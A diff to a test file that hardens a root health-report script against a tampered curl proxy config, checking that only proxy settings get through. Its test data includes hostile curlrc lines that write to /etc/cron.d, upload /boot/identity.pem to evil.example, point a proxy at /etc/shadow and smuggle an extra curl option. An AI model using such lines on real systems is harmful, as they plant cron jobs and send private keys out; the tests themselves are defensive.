@@ -494,9 +494,31 @@ describe("the proxy curl config for scripts outside the daemon", () => {
 
   it("the health script uses it when present and stays valid bash", () => {
     const script = buildHealthReportScript({ controlPlaneBaseUrl: "https://flagshipserver.com", serverDomain: "home.a.flagship.services" });
-    expect(script).toContain("[ -r /var/flagship/outbound-proxy.curlrc ] && proxy=(-K /var/flagship/outbound-proxy.curlrc)");
+    expect(script).toContain("if [ -f /var/flagship/outbound-proxy.curlrc ] && [ ! -L /var/flagship/outbound-proxy.curlrc ]; then");
+    expect(script).toContain("proxy=(-K -)");
+    expect(script).not.toContain("-K /var/flagship/outbound-proxy.curlrc");
     const d = mkdtempSync(join(tmpdir(), "health-"));
     writeFileSync(join(d, "h.sh"), script);
     execFileSync("bash", ["-n", join(d, "h.sh")]);
+  });
+
+  it("the root health script passes on only the proxy and its user, never the daemon-written file", () => {
+    const d = mkdtempSync(join(tmpdir(), "health-proxy-"));
+    const rc = join(d, "outbound-proxy.curlrc");
+    const script = buildHealthReportScript({ controlPlaneBaseUrl: "https://flagshipserver.com", serverDomain: "home.a.flagship.services", proxyCurlrcPath: rc });
+    // The proxy part of the script, printing the config it would hand curl on stdin.
+    const part = script.slice(script.indexOf('p="" u=""'), script.indexOf(" |\n  curl"));
+    const run = (contents: string) => {
+      writeFileSync(rc, contents);
+      writeFileSync(join(d, "p.sh"), `set -u\n${part}\n`);
+      return execFileSync("bash", [join(d, "p.sh")], { encoding: "utf8" });
+    };
+    const good = buildCurlrc({ upstream: { kind: "http", host: "proxy.example.net", port: 3128, username: "al", password: 'p"w\\x' }, fallbackDirect: true });
+    expect(run(good)).toBe(good);
+    expect(run(`output = "/etc/cron.d/x"\nupload-file = "/boot/identity.pem"\nproxy = "socks5h://[2001:db8::7]:9050"\nurl = "https://evil.example"\n`)).toBe(
+      'proxy = "socks5h://[2001:db8::7]:9050"\n',
+    );
+    expect(run('proxy = "file:///etc/shadow"\nproxy-user = "a:b"\n')).toBe("");
+    expect(run('proxy = "http://p:1" -o "/tmp/x"\n')).toBe("");
   });
 });
